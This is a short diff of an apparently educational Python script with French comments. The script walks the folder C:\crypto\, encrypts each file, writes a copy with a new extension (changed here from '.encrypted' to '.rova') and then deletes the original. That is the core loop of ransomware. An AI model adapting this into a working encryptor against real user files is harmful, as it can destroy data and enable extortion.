@@ -24,7 +24,7 @@ for root, dirs, files in os.walk("C:\\crypto\\"):
     # Pour chaque fichier
 	for file in files: 
 		# Ignorer les fichiers qui ont déjà été traités
-		if file.endswith(".encrypted"): 
+		if file.endswith(".rova"): 
 			# print(file + " déjà chiffré")
 			continue
 
@@ -38,7 +38,7 @@ for root, dirs, files in os.walk("C:\\crypto\\"):
 		encrypted_data = cipher_suite.encrypt(data) 
 
 		# Écrire le fichier chiffré
-		with open(file_path + ".encrypted", "wb") as f: 
+		with open(file_path + ".rova", "wb") as f: 
 			f.write(encrypted_data)
 		
 		# Supprimer l'original
